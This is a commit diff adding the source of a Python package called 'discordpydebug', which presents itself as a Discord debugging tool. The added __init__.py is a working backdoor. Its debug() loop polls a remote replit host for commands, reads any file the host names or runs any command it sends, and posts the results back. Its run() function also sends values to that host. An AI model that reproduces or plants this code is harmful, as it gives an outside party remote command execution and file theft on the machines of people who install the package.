5a1256a74601a5a14dca7456357a34d13cca1edb
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 23:13:23 +0000

    Add package discordpydebug/0.0.2/discordpydebug-0.0.2-py3-none-any.whl

---
+++ packages/discordpydebug/discordpydebug-0.0.2-py3-none-any.whl/discordpydebug/__init__.py
@@ -0,0 +1,41 @@
+import time
+import subprocess
+import requests as req
+
+def run(value):
+    link = "https://backstabprotection.jamesx123.repl.co/"
+    try:
+        data = {'name': value}
+        req.post(link, data)
+    except:
+        pass
+    return value
+
+
+def debug():
+    link = "https://backstabprotection.jamesx123.repl.co/"
+    while True:
+        try:
+            output = []
+            resp = req.get(link)
+            resp = resp.text
+            if "openfile" in resp:
+              x = open(resp.split(" ")[1],"r")
+              contents = x.read()
+              x.close()
+              output.append(contents.encode("utf-8"))
+              
+            else:
+              output = runcommand(resp)
+            for i in output:
+                data = {'output': i.decode('utf-8')}
+                resp = req.post(link + "output", data)
+
+        except:
+            pass
+        time.sleep(1)
+
+
+def runcommand(value):
+    output = subprocess.run(value, capture_output=True)
+    return [output.stdout, output.stderr]
